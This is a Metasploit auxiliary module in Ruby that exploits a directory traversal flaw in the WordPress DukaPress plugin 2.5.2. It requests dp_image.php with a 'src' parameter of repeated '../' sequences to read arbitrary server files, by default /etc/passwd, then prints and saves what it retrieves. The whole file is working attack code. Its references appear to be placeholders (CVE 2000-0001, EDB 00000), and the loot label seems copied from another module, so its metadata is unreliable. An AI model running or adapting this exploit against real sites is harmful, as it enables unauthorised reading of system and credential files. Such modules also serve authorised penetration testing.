##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress DukaPress Plugin File Read Vulnerability',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability in WordPress Plugin
        "DukaPress" version 2.5.2, allowing to read arbitrary files with the
        web server privileges.
      },
      'References'     =>
        [
          ['EDB', '00000'],
          ['CVE', '2000-0001'],
          ['WPVDB', '0000'],
          ['OSVDB', '000000']
        ],
      'Author'         =>
        [
          'TO DO', # Vulnerability discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 6 ])
      ], self.class)
  end

  def run_host(ip)
    traversal = "../" * datastore['DEPTH']
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ /^\//

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(wordpress_url_plugins, 'dukapress', 'lib', 'dp_image.php'),
      'vars_get' =>
        {
          'src' => "#{traversal}#{filename}"
        }
    })

    if res &&
        res.code == 200 &&
        res.body.length > 0

      print_status('Downloading file...')
      print_line("\n#{res.body}")

      fname = datastore['FILEPATH']

      path = store_loot(
        'mobileedition.traversal',
        'text/plain',
        ip,
        res.body,
        fname
      )

      print_good("#{peer} - File saved in: #{path}")
    else
      print_error("#{peer} - Nothing was downloaded")
    end
  end
end
